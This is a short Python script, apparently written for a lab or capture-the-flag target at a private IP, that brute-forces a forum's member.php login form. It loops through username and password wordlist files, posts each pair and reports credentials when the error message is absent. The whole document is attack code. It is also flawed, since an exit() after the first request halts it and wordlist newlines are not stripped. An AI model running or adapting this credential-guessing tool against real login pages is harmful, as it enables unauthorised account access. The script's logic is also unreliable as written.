import requests

url = 'http://10.10.119.217/member.php?action=login'

with open('users_all.txt') as users:
	for user in users:
		with open('pass.txt') as passes:
			for password in passes:
				#headers = requests.post(url).headers
				data = {'username': user, 'password' : password,'remember':'yes','submit':'Login','action':'do_login',
						'url': 'http://10.10.119.217/index.php'}
				print(f"trying {user} with {password}")

				req = requests.post(url,data=data)
				
				print(req.text)
				exit()
				if "correct the following errors" not in req.text:
					print(f"correct creds found: username:{user} and password:{password}")
